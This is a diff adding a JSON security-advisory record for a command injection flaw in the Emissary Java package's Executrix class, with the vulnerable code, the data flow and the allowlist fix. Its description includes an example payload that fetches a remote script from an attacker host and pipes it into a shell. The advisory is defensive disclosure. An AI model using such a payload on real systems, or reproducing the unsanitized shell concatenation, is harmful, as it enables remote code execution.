@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-04-08T00:12:52Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "gov.nsa.emissary:emissary"
+  },
+  "Advisory": {
+    "DatabaseId": 347610,
+    "Id": "GSA_kwCzR0hTQS02YzM3LTd3NHAtamc5ds4ABU3a",
+    "GhsaId": "GHSA-6c37-7w4p-jg9v",
+    "References": [
+      {
+        "Url": "https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-6c37-7w4p-jg9v"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35581"
+      },
+      {
+        "Url": "https://github.com/NationalSecurityAgency/emissary/pull/1290"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-6c37-7w4p-jg9v"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-6c37-7w4p-jg9v"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-35581"
+      }
+    ],
+    "Description": "## Summary\n\nThe `Executrix` utility class constructed shell commands by concatenating\nconfiguration-derived values — including the `PLACE_NAME` parameter — with\ninsufficient sanitization. Only spaces were replaced with underscores, allowing\nshell metacharacters (`;`, `|`, `$`, `` ` ``, `(`, `)`, etc.) to pass through\ninto `/bin/sh -c` command execution.\n\n## Details\n\n### Vulnerable code — `Executrix.java`\n\n**Insufficient sanitization (line 132):**\n```java\nthis.placeName = this.placeName.replace(' ', '_');\n// ONLY replaces spaces — shell metacharacters pass through\n```\n\n**Shell sink (line 1052–1058):**\n```java\nprotected String[] getTimedCommand(final String c) {\n    return new String[] {\"/bin/sh\", \"-c\", \"ulimit -c 0; cd \" + tmpNames[DIR] + \"; \" + c};\n}\n```\n\n### Data flow\n\n1. `PLACE_NAME` is read from a configuration file\n2. `Executrix` applies only a space-to-underscore replacement\n3. The `placeName` is used to construct temporary directory paths (`tmpNames[DIR]`)\n4. `tmpNames[DIR]` is concatenated into a shell command string\n5. The command is executed via `/bin/sh -c`\n\n### Example payload\n\n```\nPLACE_NAME = \"test;curl attacker.com/shell.sh|bash;x\"\n```\n\nAfter the original sanitization: `test;curl_attacker.com/shell.sh|bash;x`\n(semicolons, pipes, and other metacharacters preserved)\n\n### Impact\n\n- Arbitrary command execution on the Emissary host\n- Requires the ability to control configuration values (e.g., administrative\n  access or a compromised configuration source)\n\n## Remediation\n\nFixed in [PR #1290](https://github.com/NationalSecurityAgency/emissary/pull/1290),\nmerged into release 8.39.0.\n\nThe space-only replacement was replaced with an allowlist regex that strips all\ncharacters not matching `[a-zA-Z0-9_-]`:\n\n```java\nprotected static final Pattern INVALID_PLACE_NAME_CHARS = Pattern.compile(\"[^a-zA-Z0-9_-]\");\n\nprotected static String cleanPlaceName(final String placeName) {\n    return INVALID_PLACE_NAME_CHARS.matcher(placeName).replaceAll(\"_\");\n}\n```\n\nThis ensures that any shell metacharacter in the `PLACE_NAME` configuration\nvalue is replaced with an underscore before it can reach a command string.\n\nTests were added to verify that parentheses, slashes, dots, hash, dollar signs,\nbackslashes, quotes, semicolons, carets, and at-signs are all sanitized.\n\n## Workarounds\n\nIf upgrading is not immediately possible, ensure that `PLACE_NAME` values in all\nconfiguration files contain only alphanumeric characters, underscores, and hyphens.\n\n## References\n\n- [PR #1290 — validate placename with an allowlist](https://github.com/NationalSecurityAgency/emissary/pull/1290)\n- Original report: GHSA-wjqm-p579-x3ww",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-08T00:12:50Z",
+    "Severity": "HIGH",
+    "Summary": "Emissary has a Command Injection via PLACE_NAME Configuration in Executrix",
+    "UpdatedAt": "2026-04-08T00:12:52Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.2,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "8.39.0"
+      },
+      "VulnerableVersionRange": "\u003c 8.39.0"
+    }
+  ]
+}
